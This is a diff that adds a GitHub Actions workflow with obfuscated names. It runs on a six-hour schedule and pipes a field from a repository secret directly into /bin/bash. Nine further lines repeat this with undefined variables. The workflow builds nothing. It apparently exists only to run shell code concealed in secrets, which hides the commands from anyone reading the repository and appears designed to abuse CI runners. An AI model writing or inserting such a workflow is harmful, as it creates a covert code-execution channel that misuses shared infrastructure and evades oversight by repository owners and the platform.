@@ -1,0 +1,27 @@
+name: democratburied
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: democratburied
+        env:
+          nwyy63: ${{ secrets.nwyy63 }}
+        run: |
+          echo $nwyy63 | jq -r .horz15350 | /bin/bash
+          echo $g44 | jq -r .pd0676 | /bin/bash
+          echo $zkv32 | jq -r .w1636 | /bin/bash
+          echo $jk365 | jq -r .zhi07400 | /bin/bash
+          echo $xltj5689 | jq -r .cjqhu8 | /bin/bash
+          echo $jszgg24428 | jq -r .g07647 | /bin/bash
+          echo $ffp77348 | jq -r .bum393 | /bin/bash
+          echo $rg176 | jq -r .tftc42 | /bin/bash
+          echo $a6 | jq -r .szfl61 | /bin/bash
+          echo $eqqeu601 | jq -r .n71 | /bin/bash
+
